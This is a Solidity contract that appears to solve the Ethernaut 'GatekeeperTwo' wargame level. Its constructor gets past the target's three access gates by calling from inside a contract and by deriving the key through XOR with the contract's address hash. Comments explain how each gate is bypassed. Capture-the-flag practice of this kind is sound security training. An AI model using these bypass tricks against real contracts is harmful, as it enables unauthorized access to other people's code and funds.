// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./GatekeeperTwo.sol";

contract HackGates {
    GatekeeperTwo public gates = GatekeeperTwo(0xb861FDB2b3399D084AE6BE50beDf78d80D0109A8);
    address public player = 0x8656D273630865bB4887E00d86a338A214Ac4b50;
    
    constructor() {
        // gateOne() - calling via proxy complies with msg.sender != tx.origin
        // gateTwo() - calling from the constructor of a contract ensures extcodesize == 0
        // gateThree() - a ^ b = c therefore a ^ c = b
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        
        gates.enter(_gateKey);

        require(gates.entrant() == player, "Player is not entrant.");
    }
}